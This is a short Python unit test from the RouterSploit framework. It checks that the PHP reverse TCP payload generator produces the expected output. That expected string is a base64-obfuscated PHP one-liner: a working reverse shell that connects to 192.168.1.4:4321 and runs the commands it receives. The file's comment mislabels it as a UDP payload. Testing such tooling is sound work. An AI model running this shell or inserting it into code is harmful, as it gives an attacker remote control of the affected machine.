from routersploit.modules.payloads.cmd.php_reverse_tcp import Payload


# php reverse udp payload with lhost=192.168.1.4 lport=4321
reverse_tcp = (
    "php -r \"eval(base64_decode('JHM9ZnNvY2tvcGVuKCJ0Y3A6Ly8xOTIuMTY4LjEuNCIsNDMyMSk7d2hpbGUoIWZlb2YoJHMpKXtleGVjKGZnZXRzKCRzKSwkbyk7JG89aW1wbG9kZSgiXG4iLCRvKTskby49IlxuIjtmcHV0cygkcywkbyk7fQ=='));\""
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.run() == reverse_tcp
